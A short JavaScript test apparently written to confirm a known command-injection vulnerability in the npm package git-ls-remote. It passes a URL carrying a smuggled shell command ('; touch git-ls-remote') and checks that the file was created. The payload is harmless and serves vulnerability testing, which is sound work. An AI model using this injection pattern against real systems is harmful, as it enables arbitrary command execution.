//https://snyk.io/vuln/npm:git-ls-remote:20160923
test("Command Injection in git-ls-remote", () => {
  const git = require("git-ls-remote");
  const fs = require("fs");
  const path = "./git-ls-remote";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.head("https://gitrepo.com/; touch git-ls-remote", function (
    err,
    result
  ) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
